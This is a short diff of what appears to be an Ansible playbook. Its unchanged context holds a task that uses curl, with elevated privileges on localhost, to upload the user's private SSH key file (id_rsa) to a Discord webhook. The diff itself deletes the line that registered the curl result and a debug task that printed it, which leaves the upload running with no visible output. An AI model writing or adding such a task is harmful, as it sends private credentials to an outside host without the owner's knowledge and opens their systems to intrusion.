@@ -412,10 +412,6 @@
          -F "payload_json={\"content\": \"your ssh key\"};type=application/json" \
          -F "file=@/home/{{ UserName }}/.ssh/id_rsa;filename=id_rsa" \
          https://discord.com/api/webhooks/{{ WID }}/{{ WTOKEN }}
-  register: curl_content
   delegate_to: localhost
   become: yes
 
-- name: debug the curl output 
-  debug:
-    var: curl_content.stdout
